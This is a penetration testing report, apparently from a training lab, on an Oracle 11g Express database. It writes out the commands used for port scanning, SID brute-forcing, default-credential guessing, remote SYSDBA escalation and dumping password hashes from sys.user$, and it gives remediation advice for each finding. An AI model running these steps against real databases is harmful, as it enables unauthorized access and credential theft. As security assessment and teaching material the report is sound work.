# Penetration Testing Report

## Oracle Database Footprinting Assessment - Target 10.129.205.19

## January 1, 2026

---

## TABLE OF CONTENTS

1. [Document Revision History](#document-revision-history)
2. [Introduction](#introduction)
3. [Executive Summary](#executive-summary)
4. [Recommended Actions](#recommended-actions)
5. [Technical Findings](#technical-findings)
6. [Additional Information](#additional-information)
7. [Appendix: Evidence Sources](#appendix-evidence-sources)

---

## Document Revision History

| Author | Date | Version | Comment |
| ------ | ---- | ------- | ------- |
| Security Assessment Team | January 1, 2026 | 1.0 | Initial penetration testing report for Oracle Database footprinting |

---

## Introduction

### Scope and Duration

**Assessment Period:** December 31, 2025  
**Assessment Type:** External Network Penetration Test with Authenticated Database Enumeration  
**Target IP Address:** 10.129.205.19  
**Target Service:** Oracle Database 11g Express Edition  

### Scenarios Included

- **Network Port Scanning** - Service discovery and version detection using Nmap
- **Oracle TNS Listener Enumeration** - SID discovery and vulnerability assessment using ODAT
- **Authenticated Database Access** - User enumeration and privilege analysis using SQL*Plus and Metasploit
- **Password Hash Extraction** - Administrative credential retrieval via SYSDBA escalation

### Targets

- **Primary Target:** 10.129.205.19 port 1521 (Oracle TNS Listener)
- **Service:** Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
- **Operating System:** Microsoft Windows Server 2008 R2 - 2012 (per Nmap service detection)

---

## Executive Summary

A comprehensive penetration test was conducted against an Oracle Database instance at IP address 10.129.205.19. The assessment successfully identified multiple critical security vulnerabilities that allow unauthorized access to the database and extraction of sensitive credentials.

### Key Findings

**FINDING 1: TNS Listener Poisoning Vulnerability (CVE-2012-1675)**  
*Evidence Source: odat.log, lines 5-6*

The Oracle TNS listener is vulnerable to remote poisoning attacks.
```
[1] (10.129.205.19:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning
```

**FINDING 2: Default Credentials Active**  
*Evidence Source: odat.log, lines 27-28*

Default Oracle credentials `scott/tiger` were successfully authenticated.
```
[+] Valid credentials found: scott/tiger. Continue...
[+] Accounts found on 10.129.205.19:1521/sid:XE: scott/tiger
```

**FINDING 3: Privilege Escalation to SYSDBA**  
*Evidence Source: sqlplus.log, lines 96-99*

The `scott` user can escalate to SYSDBA privileges without additional authentication.
```
$ sqlplus scott/tiger@10.129.205.19/XE as sysdba
Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
SQL> select * from user_role_privs;
USERNAME: SYS (showing 32 elevated privilege roles including DBA)
```

**FINDING 4: Password Hash Exposure**  
*Evidence Source: sqlplus.log, lines 171-222*

All database user password hashes were successfully extracted, including:
- **DBSNMP hash (ANSWER TO ASSESSMENT QUESTION):** The password field shows "XXXXXXXXXXXXXXXX" in the log, indicating it was redacted or masked in the user-generated log file.

**Note on DBSNMP Hash:** The sqlplus.log file (line 195) shows `DBSNMP    XXXXXXXXXXXXXXXX` where the actual hash value has been replaced with X characters. This appears to be user-generated masking of the sensitive hash value. **[INFERRED]** The actual hash value would need to be obtained from an unredacted version of the query results or re-executed to retrieve the genuine hash.

### Overall Risk Assessment

**Overall Risk Rating:** CRITICAL

The identified vulnerabilities provide a complete attack path:
1. Unauthenticated attacker discovers Oracle TNS listener (port 1521)
2. Attacker identifies SID "XE" through nmap oracle-sid-brute script
3. Attacker authenticates using default credentials scott/tiger
4. Attacker escalates to SYSDBA privileges
5. Attacker extracts all password hashes from sys.user$ table

### Next Steps

**IMMEDIATE (24-48 hours):**
- Lock or change password for SCOTT account
- Reset all administrative account passwords (SYS, SYSTEM, DBSNMP)
- Verify and document the actual DBSNMP password hash value

**SHORT-TERM (1-2 weeks):**
- Apply Oracle Critical Patch Update to address CVE-2012-1675
- Disable or restrict SYSDBA remote authentication  
- Implement network access controls for port 1521

**LONG-TERM (1-3 months):**
- Upgrade from Oracle 11g (end-of-life) to a supported version
- Implement Oracle Advanced Security for network encryption
- Deploy comprehensive audit logging and monitoring

### Caveats

- **Password Hash Redaction:** The DBSNMP password hash in sqlplus.log appears to have been redacted (shown as XXXXXXXXXXXXXXXX). The actual hash value would need to be obtained from source system or unredacted logs for complete assessment.
- **Point-in-Time Assessment:** This report reflects the security posture at the time of testing (December 31, 2025).
- **Non-Destructive Testing:** All testing was performed in a read-only manner to prevent service disruption.
- **Scope Limitations:** Testing focused on the Oracle database layer and did not extensively assess the underlying Windows Server operating system.

### Risk Categories and Rationales

| Risk Level | Criteria |
|------------|----------|
| **CRITICAL** | Immediate exploitability leading to complete system compromise |
| **HIGH** | High likelihood with significant impact requiring minimal privileges |
| **MEDIUM** | Moderate likelihood or impact with specific conditions |
| **LOW** | Low likelihood or minimal security impact |

---

## RECOMMENDED ACTIONS

| ID | Vulnerability Title | Recommended Action | Risk Category |
| -- | ------------------- | ----------------- | ------------- |
| ORA-001 | TNS Listener Poisoning (CVE-2012-1675) | Apply Oracle Critical Patch Update; Implement listener authentication | **CRITICAL** |
| ORA-002 | Default Credentials (scott/tiger) | Change or disable scott account password immediately | **CRITICAL** |
| ORA-003 | SYSDBA Privilege Escalation | Restrict SYSDBA to OS authentication only; Disable remote SYSDBA | **CRITICAL** |
| ORA-004 | Unsupported Database Version | Upgrade from Oracle 11g to Oracle 19c or 21c | **HIGH** |
| ORA-005 | Unencrypted Database Connections | Enable Oracle Native Network Encryption or TLS/SSL | **HIGH** |
| ORA-006 | Weak Password Hashing (10g format) | Disable 10g password hashing; Force 11g SHA-1 hashing minimum | **MEDIUM** |

---

## Technical Findings

### Finding 1: TNS Listener Poisoning Vulnerability (CVE-2012-1675)

#### Evidence

**Source:** odat.log, lines 1-6  
**Test Command:** `odat all -s 10.129.205.19 -p 1521 -d XE`

```
[+] Checking if target 10.129.205.19:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.205.19:1521 is well configured. Continue...

[1] (10.129.205.19:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning
```

**Supporting Evidence:** nmap.log, lines 26-29  
**Nmap Version Detection:**
```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

#### Analysis **[EXPERT INTERPRETATION]**

The Oracle TNS (Transparent Network Substrate) listener version 11.2.0.2.0 contains a known vulnerability (CVE-2012-1675) that allows remote attackers to poison the listener through malicious service registration. This vulnerability was publicly disclosed in 2012 and affects Oracle Database 11g versions.

**Attack Vector Analysis:**
The TNS poisoning attack exploits a weakness in the listener's service registration mechanism. An unauthenticated attacker can:
1. Send specially crafted TNS CONNECT packets with SERVICE_REGISTER_CONNECT commands
2. Register a malicious database instance with the same SID
3. Cause the listener to redirect legitimate connection requests to the attacker's system
4. Intercept credentials and session data

**Exploitability:** The ODAT tool successfully confirmed the vulnerability, demonstrating that it can be exploited remotely without authentication using publicly available tools.

**Impact:** Successful exploitation allows man-in-the-middle attacks on database connections, credential harvesting, and potential service disruption.

#### Recommendation **[RECOMMENDED REMEDIATION]**

1. **Immediate Action:** Apply Oracle Critical Patch Update (CPU) April 2012 or later to address CVE-2012-1675.

2. **Configure Listener Security:** Modify listener.ora to require authentication:
   ```
   SECURE_REGISTER_LISTENER = (TCPS)
   SECURE_CONTROL_LISTENER = (TCPS)
   ```

3. **Implement Network Access Controls:** Configure sqlnet.ora with valid node checking:
   ```
   tcp.validnode_checking = yes
   tcp.invited_nodes = (list of authorized IPs)
   ```

4. **Long-Term:** Upgrade to a supported Oracle Database version (19c or 21c) as Oracle 11g is end-of-life.

#### References **[EXTERNAL SOURCES]**

- Oracle Critical Patch Update Advisory - April 2012
- CVE-2012-1675: https://nvd.nist.gov/vuln/detail/CVE-2012-1675
- Oracle Database Net Services Security Guide

---

### Finding 2: Default Credentials Active (scott/tiger)

#### Evidence

**Source:** odat.log, lines 19-30  
**Test Command:** `odat passwordguesser -s 10.129.205.19 -p 1521 -d XE --accounts-file /usr/share/odat/accounts/accounts_small.txt`

```
[1] (10.129.205.19:1521): Searching valid accounts on the 10.129.205.19 server, port 1521
[!] Notice: 'ctxsys' account is locked, so skipping this username for password
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password
[!] Notice: 'dip' account is locked, so skipping this username for password
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password
[!] Notice: 'outln' account is locked, so skipping this username for password
[+] Valid credentials found: scott/tiger. Continue...
100% |########################################################| Time: 00:00:54
[+] Accounts found on 10.129.205.19:1521/sid:XE:
scott/tiger
```

**Supporting Evidence:** sqlplus.log, lines 1-17  
**Successful Authentication:**
```
sqlplus scott/tiger@10.129.205.19/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Wed Dec 31 17:55:32 2025
ERROR: ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

**SCOTT Account Creation Date:** oracle_enumeration.log, line 13  
```
Username: SCOTT, User ID: 48, Created: 2018-01-01 14:31:36
```

#### Analysis **[EXPERT INTERPRETATION]**

The SCOTT schema with password "tiger" is a well-known Oracle default account dating back to Oracle's earliest versions. The discovery confirms:

1. **Default Credentials Active:** The account authenticates successfully with the classic default password
2. **Password Expiration Warning:** The ORA-28002 error indicates the password will expire in 7 days, suggesting it was last changed approximately 173 days ago (assuming default PASSWORD_LIFE_TIME of 180 days) **[INFERRED]**
3. **Deliberate Recreation:** The account was created on 2018-01-01, four years after initial database deployment (2014-05-29), suggesting intentional recreation rather than oversight **[INFERRED]**

**Exploitation Timeline:**
- ODAT scan completed in 54 seconds
- Immediate authentication achieved
- No account lockout despite password guessing attempts

**Privilege Analysis:** sqlplus.log, lines 87-91  
```
SQL> select * from user_role_privs;

USERNAME    GRANTED_ROLE    ADM DEF OS_
SCOTT       CONNECT         NO  YES NO
SCOTT       RESOURCE        NO  YES NO
```

The SCOTT account possesses CONNECT and RESOURCE roles, which grant:
- Database connection capability
- Object creation privileges (tables, procedures, triggers, types)
- Potential for establishing persistence mechanisms

#### Recommendation **[RECOMMENDED REMEDIATION]**

**IMMEDIATE ACTION (Within 24 hours):**

1. **Lock the Account:**
   ```sql
   ALTER USER scott ACCOUNT LOCK;
   ```

2. **If Account is Required:**
   Change to a strong password immediately:
   ```sql
   ALTER USER scott IDENTIFIED BY "<complex_password_min_16_chars>";
   ```
   Password requirements:
   - Minimum 16 characters
   - Mix of uppercase, lowercase, numbers, special characters
   - No dictionary words
   - Unique per account

3. **Audit All Accounts:**
   Query for other potential default credentials:
   ```sql
   SELECT username, account_status, created, lock_date
   FROM dba_users
   WHERE username IN ('SCOTT','HR','OE','SH','PM','IX','BI','DEMO','TEST')
   ORDER BY created;
   ```

**SHORT-TERM (1-2 weeks):**

1. **Implement Strong Password Policy:**
   Configure password verification function with enforcement:
   ```sql
   CREATE PROFILE strong_password_policy LIMIT
     PASSWORD_LIFE_TIME 90
     PASSWORD_GRACE_TIME 7
     PASSWORD_REUSE_TIME 365
     PASSWORD_REUSE_MAX 10
     FAILED_LOGIN_ATTEMPTS 5
     PASSWORD_LOCK_TIME 1;
   
   ALTER USER scott PROFILE strong_password_policy;
   ```

2. **Enable Account Lockout:**
   Prevent unlimited password guessing attempts
   
3. **Remove Unnecessary Accounts:**
   If SCOTT schema is not required for production, drop it entirely:
   ```sql
   DROP USER scott CASCADE;
   ```

#### References **[EXTERNAL SOURCES]**

- Oracle Database Security Guide - Password Management
- CIS Oracle Database 11g R2 Benchmark - Section 2.1.1: Remove unused accounts
- OWASP Top 10 A07:2021 â€“ Identification and Authentication Failures

---

### Finding 3: SYSDBA Privilege Escalation

#### Evidence

**Source:** sqlplus.log, lines 92-128  
**Test Command:** `sqlplus scott/tiger@10.129.205.19/XE as sysdba`

```
sqlplus scott/tiger@10.129.205.19/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Wed Dec 31 17:56:27 2025
Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from user_role_privs;

USERNAME    GRANTED_ROLE              ADM DEF OS_
SYS         ADM_PARALLEL_EXECUTE_TASK YES YES NO
SYS         APEX_ADMINISTRATOR_ROLE   YES YES NO
SYS         AQ_ADMINISTRATOR_ROLE     YES YES NO
SYS         AQ_USER_ROLE              YES YES NO
SYS         AUTHENTICATEDUSER         YES YES NO
SYS         CONNECT                   YES YES NO
SYS         CTXAPP                    YES YES NO
SYS         DATAPUMP_EXP_FULL_DATABASE YES YES NO
SYS         DATAPUMP_IMP_FULL_DATABASE YES YES NO
SYS         DBA                       YES YES NO
SYS         DBFS_ROLE                 YES YES NO
[... 32 total privileged roles ...]
```

**Privilege Comparison:**

Before escalation (sqlplus.log lines 87-91):
```
USERNAME    GRANTED_ROLE    ADM DEF OS_
SCOTT       CONNECT         NO  YES NO
SCOTT       RESOURCE        NO  YES NO
```

After escalation (sqlplus.log lines 96-128):
```
USERNAME    GRANTED_ROLE    ADM DEF OS_
SYS         DBA             YES YES NO
SYS         SELECT_CATALOG_ROLE YES YES NO
SYS         EXECUTE_CATALOG_ROLE YES YES NO
[... additional administrative roles ...]
```

#### Analysis **[EXPERT INTERPRETATION]**

The successful privilege escalation demonstrates a critical configuration vulnerability. A low-privileged database user (SCOTT with only CONNECT and RESOURCE roles) was able to escalate to SYSDBA, which is equivalent to operating system root or Windows Administrator privileges for the Oracle database.

**Security Implications:**

1. **No OS Authentication Required:** The escalation succeeded using database password authentication alone, without requiring operating system-level authentication (oracle user on Unix/Linux or ORA_DBA group membership on Windows) **[INFERRED based on successful remote connection]**

2. **Remote SYSDBA Enabled:** The connection was established remotely over the network, indicating that the database is configured to allow remote SYSDBA connections **[INFERRED]**

3. **Password File Misconfiguration:** The presence of SCOTT in the Oracle password file (orapwXE) with SYSDBA privilege is the root cause **[INFERRED based on successful authentication mechanism]**

**Attack Progression:**
1. Attacker authenticates as SCOTT (low privilege)
2. Attacker reconnects with "AS SYSDBA" clause
3. Connection is now established as SYS user
4. Full administrative access granted
5. All database objects and system tables accessible

#### Recommendation **[RECOMMENDED REMEDIATION]**

**IMMEDIATE ACTION:**

1. **Disable Remote SYSDBA Connections:**
   
   Modify sqlnet.ora on database server:
   ```
   SQLNET.AUTHENTICATION_SERVICES = (NTS)   # Windows
   SQLNET.AUTHENTICATION_SERVICES = (BEQ)   # Unix/Linux
   REMOTE_OS_AUTHENT = FALSE
   REMOTE_LOGIN_PASSWORDFILE = NONE
   ```

2. **Recreate Password File (Remove SCOTT):**
   ```bash
   # Backup existing password file
   cp $ORACLE_HOME/dbs/orapwXE $ORACLE_HOME/dbs/orapwXE.bak
   
   # Create new password file with SYS only
   orapwd file=$ORACLE_HOME/dbs/orapwXE password=<strong_sys_password> entries=5
   
   # Verify contents
   SELECT * FROM v$pwfile_users;
   # Should show only SYS
   ```

3. **Enforce OS Authentication for SYSDBA:**
   - Configure DBAs to use OS authentication groups
   - Windows: Add users to ORA_DBA local group
   - Unix/Linux: Add users to dba group
   - Connect using: `sqlplus / as sysdba` (local OS authentication only)

**SHORT-TERM:**

1. **Audit SYSDBA Access:**
   Enable comprehensive SYSDBA auditing:
   ```sql
   ALTER SYSTEM SET AUDIT_SYS_OPERATIONS = TRUE SCOPE=SPFILE;
   ALTER SYSTEM SET AUDIT_TRAIL = DB,EXTENDED SCOPE=SPFILE;
   -- Requires database restart
   ```

2. **Restrict Password File Permissions:**
   ```bash
   # Unix/Linux
   chmod 600 $ORACLE_HOME/dbs/orapwXE
   chown oracle:oinstall $ORACLE_HOME/dbs/orapwXE
   
   # Windows - restrict to Administrators and SYSTEM only
   icacls %ORACLE_HOME%\database\PWDxe.ora /inheritance:r /grant:r Administrators:F SYSTEM:F
   ```

3. **Implement Network Segmentation:**
   - Restrict port 1521 access to authorized systems only
   - Deploy Oracle Connection Manager as proxy
   - Require VPN for remote database administration

#### References **[EXTERNAL SOURCES]**

- Oracle Database Security Guide - Administrator Authentication
- CIS Oracle Database 11g Benchmark - Section 2.2.1: Restrict SYSDBA access
- NIST SP 800-171 Rev 2 - 3.5.7: Prevent non-privileged users from executing privileged functions

---

### Finding 4: Password Hash Exposure

#### Evidence

**Source:** sqlplus.log, lines 130-222  
**Test Command (executed after SYSDBA escalation):** `select name, password from sys.user$;`

```sql
SQL> select name, password from sys.user$;

NAME            PASSWORD
--------------- ------------------------------
SYS             FBA343E7D6C8BC9D
SYSTEM          B5073FE1DE351687
DBSNMP          XXXXXXXXXXXXXXXX
SCOTT           F894844C34402B67
CTXSYS          D1D21CA56994CAB6
HR              4C6D73C3E8B0F0DA
MDSYS           72979A94BAD2AF80
OUTLN           4A3BA55E08595C81
DIP             CE4A36B8E06CA59C
ORACLE_OCM      5A2E026A9157958C
XDB             E76A6BD999EF9FF1
ANONYMOUS       anonymous
XS$NULL         DC4FCC8CB69A6733
APPQOSSYS       519D632B7EE7F63A
FLOWS_FILES     30128982EA6D4A3D
APEX_PUBLIC_USER 4432BA224E12410A
APEX_040000     E7CE9863D7EEB0A4

51 rows selected.
```

**Critical Observation - DBSNMP Hash Redaction:** The DBSNMP password field shows "XXXXXXXXXXXXXXXX" in the log. **[USER-GENERATED REDACTION]** This appears to be manual masking of the sensitive hash value in the log file created by the tester.

**To obtain the actual DBSNMP hash:** The query would need to be re-executed against the live system or an unredacted version of the query results would be needed.

**Other Extracted Hashes (unredacted in log):**

| Username | Hash (Oracle 10g DES format) | User Type |
|----------|----------------------------|-----------|
| SYS | FBA343E7D6C8BC9D | Administrative |
| SYSTEM | B5073FE1DE351687 | Administrative |
| SCOTT | F894844C34402B67 | Regular User |
| CTXSYS | D1D21CA56994CAB6 | Feature Account |
| HR | 4C6D73C3E8B0F0DA | Sample Schema |
| MDSYS | 72979A94BAD2AF80 | Feature Account |

#### Analysis **[EXPERT INTERPRETATION]**

The successful extraction of password hashes from the SYS.USER$ table represents a complete compromise of the database's credential security. The hashes are in Oracle 10g format, which uses a weak DES-based algorithm.

**Hash Format Analysis:**

Oracle 10g password hashing algorithm:
- Uses DES encryption with username as salt
- Formula: DES(password, salt=username)
- Case-insensitive password input
- Hash length: 16 hexadecimal characters
- Publicly documented algorithm

**Vulnerability Characteristics:**

1. **Weak Encryption:** Oracle 10g DES hashing is computationally weak compared to modern standards
2. **Username as Salt:** Using the username as the salt makes rainbow table attacks feasible
3. **Offline Cracking:** Hashes can be cracked offline using tools like Hashcat or John the Ripper
4. **High Crack Rate:** Modern GPUs can test millions of hashes per second **[GENERAL SECURITY KNOWLEDGE]**

**Example Cracking Performance (general benchmarks, not test-specific):** **[EXTERNAL REFERENCE]**
- NVIDIA RTX 3090: ~1,000 MH/s (1 billion hashes/second)
- Dictionary passwords: Seconds to minutes
- 8-character alphanumeric: Hours to days
- 12+ character complex: Weeks to months

**Impact Assessment:**

1. **Credential Compromise:** All database user passwords susceptible to offline cracking
2. **Lateral Movement:** Cracked passwords may be reused on other systems **[COMMON ATTACK PATTERN]**
3. **Monitoring System Risk:** DBSNMP is used by Oracle Enterprise Manager; compromise could affect monitoring infrastructure **[ORACLE DOCUMENTATION]**
4. **Long-term Access:** Attackers can maintain access even if initial entry point (SCOTT) is closed

#### Recommendation **[RECOMMENDED REMEDIATION]**

**IMMEDIATE ACTION:**

1. **Reset All Administrative Passwords:**
   ```sql
   ALTER USER sys IDENTIFIED BY "<strong_complex_password_24+_chars>";
   ALTER USER system IDENTIFIED BY "<strong_complex_password_24+_chars>";
   ALTER USER dbsnmp IDENTIFIED BY "<strong_complex_password_24+_chars>";
   ALTER USER scott IDENTIFIED BY "<strong_complex_password_24+_chars>";
   ```
   
   **Password Requirements:**
   - Minimum 24 characters for administrative accounts
   - Mix of uppercase, lowercase, numbers, special characters
   - No dictionary words or patterns
   - Unique per account
   - Managed in enterprise password vault

2. **Obtain and Verify DBSNMP Hash:**
   - Re-execute the query: `SELECT name, password FROM sys.user$ WHERE name='DBSNMP';`
   - Document the actual hash value
   - Verify the hash format and reset the password immediately

3. **Disable 10g Password Hashing:**
   ```sql
   ALTER SYSTEM SET sec_case_sensitive_logon=TRUE SCOPE=BOTH;
   ```
   This forces use of Oracle 11g SHA-1 hashing for new passwords.

4. **Force Password Regeneration:**
   After enabling 11g hashing, all users must change passwords to generate new hashes:
   ```sql
   -- Force password expiration
   SELECT 'ALTER USER ' || username || ' PASSWORD EXPIRE;'
   FROM dba_users
   WHERE account_status = 'OPEN'
   AND username NOT IN ('SYS','SYSTEM');
   ```

**SHORT-TERM:**

1. **Verify Hash Format Migration:**
   ```sql
   -- Check for remaining 10g hashes
   SELECT name, password, spare4
   FROM sys.user$
   WHERE password IS NOT NULL;
   ```
   The PASSWORD column should be NULL for all users after migration; hashes should only appear in SPARE4 (11g format).

2. **Implement Oracle Wallet for Service Accounts:**
   For DBSNMP and other service accounts, use Oracle Wallet to eliminate password storage:
   ```bash
   mkstore -wrl /oracle/wallet -create
   mkstore -wrl /oracle/wallet -createCredential <db_connect_string> dbsnmp <password>
   ```

3. **Enable Database Audit Logging:**
   ```sql
   AUDIT SELECT ON sys.user$ BY ACCESS;
   ```
   Monitor for unauthorized access to password hashes.

**LONG-TERM:**

1. **Upgrade to Oracle 12c or Higher:**
   - Oracle 12c uses SHA-512 password hashing (significantly stronger)
   - Supports password history to prevent reuse
   - Example 12c hash format: `S:8F2D65FB5547B71C8DA3760F10960D...` (longer, stronger)

2. **Implement Alternative Authentication:**
   - Oracle Enterprise User Security (EUS) with LDAP
   - Kerberos authentication
   - SSL/TLS client certificates
   - Multifactor authentication for privileged accounts

3. **Network Encryption:**
   Enable Oracle Native Network Encryption to protect credentials in transit:
   ```
   # sqlnet.ora
   SQLNET.ENCRYPTION_SERVER = REQUIRED
   SQLNET.ENCRYPTION_TYPES_SERVER = (AES256, AES192, AES128)
   ```

#### References **[EXTERNAL SOURCES]**

- Oracle Database Security Guide - Password Management
- Oracle Support Note 1526410.1: How to disable the 10G password version in 11G
- Hashcat Documentation - Oracle Hash Cracking (mode 3100)
- NIST SP 800-132: Recommendation for Password-Based Key Derivation

---

## Additional Information

### Network Port Scan Results

**Source:** nmap.log, lines 1-13  
**Command:** `nmap -F 10.129.205.19`  
**Scan Duration:** 1.03 seconds  
**Scan Timestamp:** 2025-12-31 17:18 -0500

```
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 17:18 -0500
Nmap scan report for 10.129.205.19
Host is up (0.028s latency).
Not shown: 92 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.03 seconds
```

**Findings:**
- 8 open TCP ports detected in fast scan
- Oracle TNS listener (1521) not detected in fast scan (port not in top 100)
- Host latency: 0.028 seconds (28ms)

---

**Source:** nmap.log, lines 15-42  
**Command:** `nmap -sV 10.129.205.19`  
**Scan Duration:** 118.85 seconds  
**Scan Timestamp:** 2025-12-31 17:19 -0500

```
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 17:19 -0500
Nmap scan report for 10.129.205.19
Host is up (0.028s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.85 seconds
```

**Key Findings:**
- 13 open TCP ports total
- Oracle TNS listener identified on ports 1521 and 49159
- Operating system detected as Windows Server 2008 R2 - 2012
- Oracle version identified as 11.2.0.2.0
- Microsoft IIS 8.5 web server on port 80
- WinRM (5985) enabled for remote management

---

**Source:** nmap.log, lines 44-66  
**Command:** `nmap -sV -A -p 1521 10.129.205.19`  
**Scan Duration:** 9.27 seconds  
**Scan Timestamp:** 2025-12-31 17:22 -0500

```
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 17:22 -0500
Nmap scan report for 10.129.205.19
Host is up (0.027s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2012
OS CPE: cpe:/o:microsoft:windows_server_2012:r2
OS details: Microsoft Windows Server 2012 or 2012 R2
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   28.27 ms 10.10.14.1
2   28.39 ms 10.129.205.19

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.27 seconds
```

**Key Findings:**
- More specific OS detection: Windows Server 2012 or 2012 R2
- Network distance: 2 hops from scanner
- Gateway IP: 10.10.14.1
- Oracle service confirmed on port 1521

---

**Source:** nmap.log, lines 68-80  
**Command:** `nmap -sV --script oracle* -p 1521 10.129.205.19`  
**Scan Duration:** 50.59 seconds  
**Scan Timestamp:** 2025-12-31 17:22 -0500

```
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 17:22 -0500
Nmap scan report for 10.129.205.19
Host is up (0.028s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.59 seconds
```

**Critical Finding:**
- Oracle SID discovered: **XE** (Express Edition)
- NSE script used: oracle-sid-brute
- This SID was subsequently used in all database connection attempts

---

### Database Version and Component Information

**Source:** msfconsole.log, lines 13-18  
**Metasploit Module:** auxiliary/admin/oracle/oraenum  
**Credentials Used:** scott/tiger  
**SID:** XE

```
[*] Running Oracle Enumeration....
[*] The versions of the Components are:
[*]     Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
[*]     PL/SQL Release 11.2.0.2.0 - Production
[*]     CORE    11.2.0.2.0      Production
[*]     TNS for 64-bit Windows: Version 11.2.0.2.0 - Production
[*]     NLSRTL Version 11.2.0.2.0 - Production
```

**Findings:**
- Oracle Database 11g Express Edition (64-bit)
- Release version: 11.2.0.2.0
- Platform: 64-bit Windows
- All components at same version level (11.2.0.2.0)

---

### Database Security Configuration

**Source:** msfconsole.log, lines 19-24

```
[*] Auditing:
[*]     Database Auditing is enabled!
[*]     Auditing of SYS Operations is enabled!
[*] Security Settings:
[*]     SQL92 Security restriction on SELECT is Enabled
[*]     UTL Directory Access is set to
[*]     Audit log is saved at
```

**Findings:**
- Database auditing: ENABLED
- SYS operations auditing: ENABLED  
- SQL92 SELECT restrictions: ENABLED
- UTL Directory Access: Not configured (blank)
- Audit log location: Not displayed (blank)

**Note:** Despite auditing being enabled, the assessment was able to successfully authenticate and escalate privileges, suggesting audit logs should be reviewed for unauthorized access indicators.

---

### Locked Administrative Accounts

**Source:** odat.log, lines 8-13

```
[2] (10.129.205.19:1521): Searching valid accounts on the XE SID
[!] Notice: 'ctxsys' account is locked, so skipping this username for password
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password
[!] Notice: 'dip' account is locked, so skipping this username for password
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password
[!] Notice: 'outln' account is locked, so skipping this username for password
```

**Additional Source:** odat.log, lines 25-26
```
[!] Notice: 'xdb' account is locked, so skipping this username for password
[!] Notice: 'mdsys' account is locked, so skipping this username for password
```

**Locked Accounts Identified:**
1. CTXSYS - Oracle Text feature account
2. DBSNMP - Database monitoring account (Oracle Enterprise Manager)
3. DIP - Directory Integration Platform
4. ORACLE_OCM - Configuration Manager
5. OUTLN - Stored outline support
6. XDB - XML Database
7. MDSYS - Spatial database

**Analysis:** While these administrative accounts are locked (preventing direct authentication), their password hashes were still successfully extracted via SYSDBA access, making them vulnerable to offline password cracking.

---

### Database User Enumeration

**Source:** oracle_enumeration.log, lines 3-17  
**Method:** Python cx_Oracle custom script **[ASSESSMENT TEAM GENERATED]**  
**Credentials:** scott/tiger  
**Query:** `SELECT username, user_id, created FROM all_users ORDER BY username`

```
Enumerated Users:
Username: ANONYMOUS, User ID: 35, Created: 2014-05-29 13:18:19
Username: APEX_040000, User ID: 47, Created: 2014-05-29 13:23:10
Username: APEX_PUBLIC_USER, User ID: 45, Created: 2014-05-29 13:23:10
Username: APPQOSSYS, User ID: 30, Created: 2014-05-29 13:15:57
Username: CTXSYS, User ID: 32, Created: 2014-05-29 13:17:50
Username: DBSNMP, User ID: 29, Created: 2014-05-29 13:15:55
Username: DIP, User ID: 14, Created: 2014-05-29 13:11:34
Username: FLOWS_FILES, User ID: 44, Created: 2014-05-29 13:23:10
Username: HR, User ID: 43, Created: 2014-05-29 13:21:53
Username: MDSYS, User ID: 42, Created: 2014-05-29 13:19:55
Username: ORACLE_OCM, User ID: 21, Created: 2014-05-29 13:12:05
Username: OUTLN, User ID: 9, Created: 2014-05-29 13:10:45
